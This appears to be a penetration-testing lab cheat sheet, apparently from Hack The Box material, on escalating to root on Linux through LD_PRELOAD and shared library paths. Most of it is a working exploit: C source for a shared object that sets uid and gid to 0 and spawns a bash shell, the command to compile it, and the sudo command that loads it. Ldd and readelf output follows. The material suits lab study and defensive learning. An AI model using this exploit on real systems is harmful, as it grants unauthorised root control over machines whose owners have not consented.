### LD_PRELOAD
```sh
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

ldd /bin/ls

```

### Shared Library compile exploit
Step 1: Create .so file from .c
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Step 2: Compile .so file on target if possible
```sh
gcc -fPIC -shared -o root.so root.c -nostartfiles
```
STep 3: Execute LD_PRELOAD exploit
```sh
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

Ldd displays the location of the object and the hexadecimal address where it is loaded into memory
```sh
htb-student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

it is possible to load shared libraries from custom locations
```sh
htb-student@NIX02:~$ readelf -d payroll  | grep PATH

 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
